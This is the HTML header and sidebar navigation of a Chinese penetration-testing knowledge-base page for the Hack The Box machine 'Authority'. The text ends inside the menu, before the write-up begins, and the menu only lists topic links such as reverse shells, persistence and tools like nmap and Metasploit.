
<!doctype html>
<html lang="zh" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
        <meta name="author" content="TimeLess613">
      
      
      
        <link rel="prev" href="../HTB-Sau/">
      
      
        <link rel="next" href="../HTB-Codify/">
      
      
      <link rel="icon" href="../../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.44">
    
    
      
        <title>HTB-Authority - HacKnowledgeBase</title>
      
    
    
      <link rel="stylesheet" href="../../../assets/stylesheets/main.0253249f.min.css">
      
        
        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+Sans:300,300i,400,400i,700,700i%7CSource+Code+Pro:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Noto Sans";--md-code-font:"Source Code Pro"}</style>
      
    
    
      <link rel="stylesheet" href="../../../static/css/extra.css">
    
    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
   <link href="../../../assets/stylesheets/glightbox.min.css" rel="stylesheet"/><style>
    html.glightbox-open { overflow: initial; height: 100%; }
    .gslide-title { margin-top: 0px; user-select: text; }
    .gslide-desc { color: #666; user-select: text; }
    .gslide-image img { background: white; }
    .gscrollbar-fixer { padding-right: 15px; }
    .gdesc-inner { font-size: 0.75rem; }
    body[data-md-color-scheme="slate"] .gdesc-inner { background: var(--md-default-bg-color);}
    body[data-md-color-scheme="slate"] .gslide-title { color: var(--md-default-fg-color);}
    body[data-md-color-scheme="slate"] .gslide-desc { color: var(--md-default-fg-color);}</style> <script src="../../../assets/javascripts/glightbox.min.js"></script></head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#summary" class="md-skip">
          跳转至
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="页眉">
    <a href="../../.." title="HacKnowledgeBase" class="md-header__button md-logo" aria-label="HacKnowledgeBase" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            HacKnowledgeBase
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              HTB-Authority
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m14.3 16-.7-2h-3.2l-.7 2H7.8L11 7h2l3.2 9zM20 8.69V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12zm-9.15 3.96h2.3L12 9z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="cyan" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="blue"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_2">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="查找">
        
          <a href="javascript:void(0)" class="md-search__icon md-icon" title="分享" aria-label="分享" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
            
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
          </a>
        
        <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
        <div class="md-search__suggest" data-md-component="search-suggest"></div>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            正在初始化搜索引擎
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
      <div class="md-header__source">
        <a href="https://github.com/TimeLess613/kiwi" title="前往仓库" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 480 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1M480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2m-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3m-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1"/></svg>
  </div>
  <div class="md-source__repository">
    TimeLess613/kiwi
  </div>
</a>
      </div>
    
  </nav>
  
    
      
<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
  <div class="md-grid">
    <ul class="md-tabs__list">
      
        
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../.." class="md-tabs__link">
          
  
  Home

        </a>
      </li>
    
  

      
        
  
  
  
    <li class="md-tabs__item">
      <a href="../../../basic-concepts/basic-concepts/" class="md-tabs__link">
        
  
    
  
  基础概念

      </a>
    </li>
  

      
        
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../information-gathering/information-gathering/" class="md-tabs__link">
          
  
  信息收集

        </a>
      </li>
    
  

      
        
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../initial-access/initial-access/" class="md-tabs__link">
          
  
  初始访问

        </a>
      </li>
    
  

      
        
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../privilege-escalation/privilege-escalation/" class="md-tabs__link">
          
  
  提权

        </a>
      </li>
    
  

      
        
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../post-exploitation/Persistence/" class="md-tabs__link">
          
  
  后渗透

        </a>
      </li>
    
  

      
        
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../arsenal/nmap/" class="md-tabs__link">
          
  
  武器库

        </a>
      </li>
    
  

      
        
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../Resources/simple-network-service/" class="md-tabs__link">
          
  
  Resources

        </a>
      </li>
    
  

      
        
  
  
  
    
    
      
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../BlueTeam/Splunk/SPL%20memo/" class="md-tabs__link">
          
  
  BlueTeam

        </a>
      </li>
    
  

    
  

      
        
  
  
    
  
  
    
    
      <li class="md-tabs__item md-tabs__item--active">
        <a href="../../active/writeup-template/" class="md-tabs__link">
          
  
  靶机WriteUp

        </a>
      </li>
    
  

      
    </ul>
  </div>
</nav>
    
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


  


<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="导航栏" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../../.." title="HacKnowledgeBase" class="md-nav__button md-logo" aria-label="HacKnowledgeBase" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    HacKnowledgeBase
  </label>
  
    <div class="md-nav__source">
      <a href="https://github.com/TimeLess613/kiwi" title="前往仓库" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 480 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1M480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2m-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3m-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1"/></svg>
  </div>
  <div class="md-source__repository">
    TimeLess613/kiwi
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_1" >
        
          
          <label class="md-nav__link" for="__nav_1" id="__nav_1_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Home
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_1">
            <span class="md-nav__icon md-icon"></span>
            Home
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../.." class="md-nav__link">
        
  
  <span class="md-ellipsis">
    主页
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../tool-links/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Tool Links
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../material-color-palette/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    配色变更
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../basic-concepts/basic-concepts/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    基础概念
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3" >
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    信息收集
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            信息收集
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../information-gathering/information-gathering/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    简介
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../information-gathering/footprinting/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    踩点
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../information-gathering/scanning/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    扫描
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../information-gathering/enumerate/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    枚举
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../information-gathering/summary/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    思路
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4" >
        
          
          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    初始访问
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4">
            <span class="md-nav__icon md-icon"></span>
            初始访问
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../initial-access/initial-access/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    简介
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../initial-access/web/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    WEB
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../initial-access/%E5%8F%8D%E5%BC%B9shell/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    反弹shell
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_5" >
        
          
          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    提权
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5">
            <span class="md-nav__icon md-icon"></span>
            提权
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../privilege-escalation/privilege-escalation/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    简介
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../privilege-escalation/waiting/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Linux
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../privilege-escalation/waiting/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Linux
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_6" >
        
          
          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    后渗透
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_6">
            <span class="md-nav__icon md-icon"></span>
            后渗透
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../post-exploitation/Persistence/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    权限维持
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../post-exploitation/ClearingTracks/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    痕迹清理
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_6_3" >
        
          
          <label class="md-nav__link" for="__nav_6_3" id="__nav_6_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Tunneling
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_6_3">
            <span class="md-nav__icon md-icon"></span>
            Tunneling
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../post-exploitation/tunneling/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Tunneling
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../post-exploitation/SSH%20Tunneling/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SSH Tunneling
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_6_4" >
        
          
          <label class="md-nav__link" for="__nav_6_4" id="__nav_6_4_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    File Transfers
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_6_4">
            <span class="md-nav__icon md-icon"></span>
            File Transfers
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../post-exploitation/FileTransfers-Linux/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Linux
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../post-exploitation/FileTransfers-Windows/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    WIndows
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_7" >
        
          
          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    武器库
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_7">
            <span class="md-nav__icon md-icon"></span>
            武器库
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../arsenal/nmap/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    nmap
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../arsenal/Netcat/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Netcat
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../arsenal/burpsuite/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Burpsuite
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../arsenal/metasploit/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Metasploit
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../arsenal/sliver-c2/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SliverC2
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../arsenal/viper/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Viper
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../arsenal/enumerate-tools/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Enumerate Tools
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../arsenal/sqlmap/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    sqlmap
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../arsenal/ldapsearch/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    ldapsearch
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_8" >
        
          
          <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Resources
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8">
            <span class="md-nav__icon md-icon"></span>
            Resources
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Resources/simple-network-service/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    简单网络服务渗透
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Resources/Shell/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Shell
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Resources/powershell/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    PowerShell
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_8_4" >
        
          
